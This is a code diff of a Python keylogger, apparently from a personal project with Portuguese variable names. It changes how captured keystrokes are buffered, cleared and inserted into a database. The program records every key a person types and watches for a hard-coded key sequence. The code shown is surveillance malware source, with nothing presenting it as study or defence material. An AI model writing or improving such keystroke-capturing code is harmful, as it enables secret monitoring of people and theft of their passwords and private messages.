@@ -9,10 +9,12 @@ time_o = 0
 password = ["1", "q", "Key.space", "'", "."]
 keys = deque(maxlen=5)
 
-def log(text):
+def log(text, clear = False):
     global conteudo
-    conteudo += text
+    if clear:
+        conteudo = ""
     time_monitor()
+    conteudo += text
 
 def time_monitor():
     global time_i
@@ -26,14 +28,15 @@ def time_monitor():
 
 def send_data():
     db = database.Database()
-    db.insert(conteudo)
+    if conteudo != "":
+        db.insert(conteudo)
+        log("", True)
 
 def monitor(key):
     try:
         log(str(key.char))
         keys.append(key.char)
     except AttributeError:
-        #log(" <" + str(key) + "> ")
         if str(key) == "Key.space":
             log(" ")
         keys.append(str(key))
